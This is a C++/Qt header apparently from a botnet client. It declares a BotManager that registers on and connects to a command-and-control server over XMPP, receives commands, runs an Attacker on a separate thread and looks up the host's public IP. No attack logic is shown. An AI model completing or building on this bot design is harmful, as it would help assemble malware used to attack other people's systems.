#ifndef BOTMANAGER_H
#define BOTMANAGER_H

#include <QObject>
#include <QString>

#define IP_ADDRESS_API "http://api.ipify.org"
#define MINUTES_OF_WAITING 10

class XmppClient;
class XmppRegClient;
class Bot;
class Message;
class QThread;
class Attacker;
class QNetworkAccessManager;
class QNetworkReply;

class BotManager : public QObject
{
    Q_OBJECT
public:
    static BotManager *instance();
signals:
    void ready();
    void unregistered();
public slots:
    void connectToCC();
    void disconnectFromCC();
    void registerOnCC();
private slots:
    void readyOnXmppClient();
    void commandReceivedOnBot(Message *command);
    void attackDone();
    void finishedOnNetworkAccessManager(QNetworkReply *reply);
    void successOnXmppRegClient(const QString& server, const QString& username, const QString& password);
    void failureOnXmppRegClient(const QString& server, const QString& username, const QString& password);
private:
    BotManager();
    ~BotManager();
    void createConnections();
    void setupConfig();
    void setupBot(const QString& pubIp);
    void sendHttpGetRequestToDiscoverIp();
    void writeEvent(const QString& event);

    XmppClient *_xmppClient;
    XmppRegClient *_xmppRegClient;
    Bot *_bot;
    QThread *_attackerThread;
    Attacker *_attacker;
    QNetworkAccessManager *_networkAccessManager;
};

#endif // BOTMANAGER_H
